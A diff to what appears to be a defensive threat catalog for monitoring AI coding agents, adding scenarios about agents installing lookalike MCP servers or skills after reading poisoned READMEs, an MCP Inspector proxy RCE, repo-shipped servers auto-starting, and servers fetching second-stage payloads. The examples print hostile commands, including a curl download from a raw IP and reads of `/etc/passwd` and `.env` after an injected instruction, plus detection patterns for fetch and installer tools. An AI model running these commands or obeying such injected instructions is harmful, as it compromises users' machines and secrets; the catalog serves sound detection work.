@@ -153,3 +153,53 @@ signal: input(text) captured from MCP ancestry matching `"tools/list"` result fr
 behavior: A filesystem- or repository-type MCP server process opens files for reading outside the session's work tree — other projects, the home directory, `/etc`, another repo checkout. The MCP server is the privileged hands of the agent: whatever it reads can be pulled into context and then written out through any of the write paths above. The builtin pack only *notes* credential reads (`filesystem.credentials.read`, decision allow); generic out-of-tree reads by the MCP server process are ungated.
 example: filesystem MCP server handling `read_file ../../other-project/.env` or `read_file /etc/passwd` after an injected instruction asked for "the config files this project depends on".
 signal: file_open(read) from MCP ancestry where the resolved path is not under the session's starting directory and not a documented dependency location (`node_modules`, `.venv`, tool caches); approval_required for out-of-tree, allow with report for in-tree. Combine with the credential-path rules of the secrets catalog, which already note the sensitive subset. Pure file_open plus ancestry, so implementable.
+
+### SC mcp-16 Agent registers an MCP server or skill through a CLI installer
+- category: mcp
+- decision: approval_required | severity: 4
+- pack: process | coverage: gap
+- observable: exec-input
+- sources: mcp-fakegit-agentbaiting, mcp-clawhavoc-skills, inject-cursor-curxecute-mcp-rce
+behavior: The agent execs the registration command of its own ecosystem — `claude mcp add`/`remove`, a marketplace or skill installer CLI (`clawhub install <skill>`), an editor's `--install-extension`/MCP registration subcommand — writing a new server, skill or command into user- or project-level config, where it auto-starts on every future session. This is the exec-visible twin of the config-write scenario above: FakeGit's AgentBaiting runs reach this exact step when the agent relays the attacker's install instructions, and ClawHavoc's typosquats of the `clawhub` CLI itself show the installer path being attacked too. It needs no file_open, so it is gateable by the monitor of this version.
+example: `claude mcp add -s user walmart-mcp -- npx -y @lookalike/walmart-mcp`; `clawhub install phantom-wallet-pro` executed by the agent after reading a poisoned README.
+signal: exec from agent ancestry with argv matching a registration/install subcommand — `claude mcp (?:add|remove)`, `clawhub (?:install|add)`, `cursor mcp (?:add|remove)`, `code --install-extension` or `<pm> add -g` where the package name matches a skill/MCP naming shape; approval_required with the source package or repo argument shown in the prompt. Pure exec argv, so implementable now.
+
+### SC mcp-17 Fetch or unpack of a skill, plugin or MCP server into an agent tool directory
+- category: supply-chain
+- decision: approval_required | severity: 4
+- pack: process | coverage: gap
+- observable: exec-input
+- sources: mcp-fakegit-agentbaiting, mcp-clawhavoc-skills
+behavior: A fetch or unpack tool — `git clone`, `gh repo clone`, `curl -o`/`wget` of a release ZIP, `tar`/`unzip` — is exec'd with a destination that lands inside an agent tool directory: `~/.claude/skills/**`, `.claude/commands/**`, `~/.openclaw/skills/**`, `~/.cursor/extensions/**`, `~/.vscode/extensions/**`. FakeGit delivered its SmartLoader loader through exactly this shape (README-blessed ZIPs from GitHub Releases); anything placed there is executable-by-instruction on the next session. The builtin pack gates package-manager installs but has no rule for the destination being the agent's own tool surface.
+example: `git clone https://github.com/one-char-off-dev/databricks-mcp ~/.claude/skills/databricks-mcp`; `unzip walmart-mcp.zip -d ~/.openclaw/skills/walmart-mcp`.
+signal: exec of program in [git, gh, curl, wget, tar, unzip, 7z] from agent ancestry where any argument resolves under an agent tool directory (the list above) or where the `clone`/`-o`/`-d`/`-C` target does; approval_required with the remote source argument in the prompt. Exec argv only, so implementable now.
+
+### SC mcp-18 MCP inspector or proxy launches a command supplied at runtime over its HTTP API
+- category: mcp
+- decision: approval_required | severity: 4
+- pack: process | coverage: gap
+- observable: exec-input
+- sources: mcp-inspector-proxy-rce
+behavior: An MCP dev tool — the Inspector's proxy (`mcp dev`, `npx @modelcontextprotocol/inspector`) or a similar local bridge — execs a command that was not part of its own launch arguments. The proxy's job is to launch MCP servers on behalf of its web UI, so whatever reaches its local HTTP endpoint (`/sse?transportType=stdio&command=...&args=...`) becomes a child exec. CVE-2025-49596 turned this into unauthenticated RCE from a browser page; the same shape covers any future tooling that mixes a local API with command launching. The monitor cannot see the HTTP request, but it sees the exec that results, and it can compare that argv against the command the proxy itself was launched with.
+example: `uv run mcp dev server.py` starts the proxy; later the same proxy execs `touch /tmp/exploited-from-the-browser` — a program+argv pair that appears nowhere in the original launch arguments.
+signal: exec whose ancestry contains an inspector/proxy process (argv containing `mcp dev` or `@modelcontextprotocol/inspector`, or exe under `**/@modelcontextprotocol/inspector/**`), where the child's program+argv differs from the proxy's own launch arguments (session baseline); approval_required on first divergent exec, deny when the runtime-supplied command is a shell or interpreter (which then also matches the shell-under-MCP scenario). Exec argv plus ancestry, so implementable now.
+
+### SC mcp-19 Work-tree-resident MCP server: the cloned repo itself becomes a tool server
+- category: mcp
+- decision: approval_required | severity: 4
+- pack: process | coverage: gap
+- observable: exec-input
+- sources: mcp-fakegit-agentbaiting, inject-cursor-rules-backdoor, mcp-glassworm-watercrawl
+behavior: An MCP server entry whose launch command resolves inside the session's work tree — a `.mcp.json` or `.cursor/mcp.json` shipped in the repository declaring `command: node ./devtools/agent-bridge.js` or `uv run ./server.py`. The first-launch gate passes, because the config existed when the monitor started; the distinguishing fact is that the launched code is unreviewed repo content, cloned minutes ago, now running with the agent's authority and the user's tokens. Editors auto-start these entries when a project is opened, so the code you just cloned from an AgentBaiting search result becomes a trusted tool server.
+example: fresh clone declares `{"mcpServers": {"bridge": {"command": "node", "args": ["./scripts/local-bridge.js"]}}}`; opening the project in the editor execs `node /home/dev/work/clone/scripts/local-bridge.js`.
+signal: exec matching an MCP launch shape (npx/uvx/node/python/docker per the launch identification above) where the resolved exe or main script path is under the session's starting work tree and the server was not seen in an earlier session of this project; approval_required (project-owned servers earn an allowlist entry after the first human approval). Exec paths only, so implementable now.
+
+### SC mcp-20 MCP server ancestry spawns fetch or package-install tooling
+- category: process
+- decision: deny | severity: 4
+- pack: process | coverage: gap
+- observable: exec-input
+- sources: mcp-glassworm-watercrawl, mcp-postmark-mcp-backdoor
+behavior: A running MCP server process — whose contract is to speak JSON-RPC on stdio and serve one service — execs a fetcher or package manager as a child: `curl`, `wget`, `npm install`, `pip install`, `unzip`, `tar`. The interpreter scenario above covers shells and scripting languages; this is the adjacent family that slips past that program list. It is the standard second stage: GlassWorm's fake server staged its payload through fresh installs, and a rug-pulled server that re-installs a dependency at runtime is the same move. A server that needs a fetcher has already broken its contract; the download-and-execute continuation is covered by the payload rules.
+example: `node .../mcp-watercrawl/index.js` → child `curl -fsSL http://91.92.242.30/x -o /var/tmp/x`; an MCP server running `npm install second-stage-pkg` from its own directory.
+signal: exec of program in [curl, wget, npm, pip, pip3, yarn, pnpm, unzip, tar] whose ancestry contains a process identified as an MCP server; deny — with the same exception mechanism as the interpreter scenario for documented wrapper servers (the official git server may exec `git`, so `git` stays off the deny list and rides the exception list instead). Exec plus ancestry, so implementable now.
